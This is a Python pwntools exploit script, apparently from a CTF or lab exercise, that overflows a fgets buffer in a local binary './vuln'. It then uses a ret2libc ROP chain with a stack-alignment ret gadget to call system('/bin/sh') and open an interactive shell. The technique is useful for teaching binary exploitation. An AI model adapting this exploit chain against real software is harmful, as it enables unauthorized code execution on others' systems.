#!/usr/bin/env python3

from pwn import *

binary = "./vuln"
context.binary = binary
#context.log_level = "debug"

e = ELF(binary)

r = ROP(e)
pop_rdi_ret = r.find_gadget(["pop rdi", "ret"]).address
ret = r.find_gadget(["ret"]).address

# The offset from buffer to return address is determined by static analysis.
#
#  400586:       48 8d 45 e0             lea    rax,[rbp-0x20]
#  40058a:       be 80 00 00 00          mov    esi,0x80
#  40058f:       48 89 c7                mov    rdi,rax
#  400592:       e8 e9 fe ff ff          call   400480 <fgets@plt>
#
# The buffer is at rbp-0x20. The return address is at rbp+0x8. So the
# offset is rbp+0x8-(rbp-0x20) = 0x28
offset = 0x28

# This is determined by dynamic analysis (using GDB). See README.md.
puts_address_in_libc = 0x7ffff7a64a30

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_offset_in_libc = libc.symbols[b"puts"]
log.info("puts_offset_in_libc: 0x{:016x}".format(puts_offset_in_libc))

libc_base_address = puts_address_in_libc - puts_offset_in_libc
libc.address = libc_base_address
log.info("libc_base_address: 0x{:016x}".format(libc.address))
system_address_in_libc = libc.symbols[b"system"]
log.info("system_address_in_libc: 0x{:016x}".format(system_address_in_libc))

sh_address_in_libc = next(libc.search(b"/bin/sh\x00"))
log.info("sh_address_in_libc: 0x{:016x}".format(sh_address_in_libc))

io = process(binary)

# Add a ret gadget that does nothing helpful (it simply jumps to the next
# address) to fix issue with stack alignment in do_system() for glibc 2.27:
# => 0x7f14bef6c2f6 <do_system+1094>:     movaps XMMWORD PTR [rsp+0x40],xmm0
payload = offset * b"A" + pack(ret) + pack(pop_rdi_ret) + pack(sh_address_in_libc) + pack(system_address_in_libc)
log.info("payload: " + "".join("\\x{:02x}".format(i) for i in payload))

#gdb.attach(io)
io.sendline(payload)

io.interactive()
